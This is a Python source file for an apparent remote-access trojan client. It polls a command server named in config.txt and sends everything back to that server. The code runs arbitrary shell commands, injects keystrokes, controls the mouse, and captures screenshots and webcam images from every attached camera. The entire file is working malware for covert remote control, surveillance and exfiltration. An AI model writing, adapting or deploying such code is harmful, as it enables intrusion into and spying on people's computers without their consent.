import subprocess
from io import BytesIO
import requests
import cv2
import time
import pyautogui
import base64

with open("config.txt", "r") as f:
    url = f.readline().strip()

ID = subprocess.check_output("whoami", shell=True).decode('utf-8').strip()

startup = " _____              _     _______            \n(____ \            | |   (_______)           \n _   \ \ ____  ____| |  _ _____  _   _  ____ \n| |   | / _  |/ ___) | / )  ___)| | | |/ _  )\n| |__/ ( ( | | |   | |< (| |____| |_| ( (/ / \n|_____/ \_||_|_|   |_| \_)_______)__  |\____)\n                                (____/       \n"


def take_picture():
    output = []
    x = -1
    while True:
        x += 1
        camera = cv2.VideoCapture(x)
        ret, frame = camera.read()
        camera.release()
        if not ret:
            break
        image_bytes = cv2.imencode('.jpg', frame)[1].tobytes()
        image_base64 = base64.b64encode(image_bytes).decode('utf-8')
        output.append(image_base64)
    return output


def execute(cmd):
    output = ""
    try:
        if cmd.startswith("cmd "):
            cmd = cmd.replace("cmd ", "")
            output = subprocess.check_output(cmd, shell=True).decode('utf-8')
        elif cmd.startswith("type "):
            cmd = cmd.replace("type ", "")
            pyautogui.typewrite(cmd)
        elif cmd.startswith("press "):
            cmd = cmd.replace("press ", "")
            pyautogui.press(cmd)
        elif cmd.startswith("screenshot"):
            output = BytesIO()
            pyautogui.screenshot().save(output, format="PNG")
            output = base64.b64encode(output.getvalue()).decode('utf-8')
        elif cmd.startswith("goto "):
            cmd = cmd.replace("goto ", "")
            cmd = cmd.split(" ")
            cmd = (int(cmd[0]), int(cmd[1]))
            pyautogui.moveTo(cmd)
            output = f"The Screen dimensions are: {pyautogui.size()}\nThe mouse position is: {pyautogui.position()}"
        elif cmd.startswith("click "):
            cmd = cmd.replace("click ", "")
            pyautogui.click(button=cmd)
            output = f"The mouse position is: {pyautogui.position()}\nCLICK!"
        elif cmd.startswith("drag "):
            cmd = cmd.replace("drag ", "")
            cmd = cmd.split(" ")
            cmd = (int(cmd[0]), int(cmd[1]), cmd[2])
            pyautogui.dragTo(cmd, button=cmd[2])
            output = f"The mouse position is: {pyautogui.position()}\nDRAG!"
        elif cmd.startswith("scroll "):
            cmd = int(cmd.replace("scroll ", ""))
            pyautogui.scroll(cmd)
            output = f"The mouse position is: {pyautogui.position()}\nSCROLL!"
        elif cmd.startswith("cam"):
            output = str(take_picture())
        elif cmd.startswith("exit"):
            requests.post(url, data=f"{ID};;; !exit!")
            exit()
    except Exception as e:
        output = "Error: " + str(e)

    return output


print(startup)
while True:
    print("_", end="")
    response = ""
    try:
        response = str(requests.get(url, data=ID).content.decode("utf-8"))
    except:
        print("x", end="")
    data = f"{ID};;; {execute(response).strip()}"
    try:
        print(requests.post(url, data=data).text, end="")
    except:
        print("x", end="")

    time.sleep((1.0 - (time.time() % 1)))
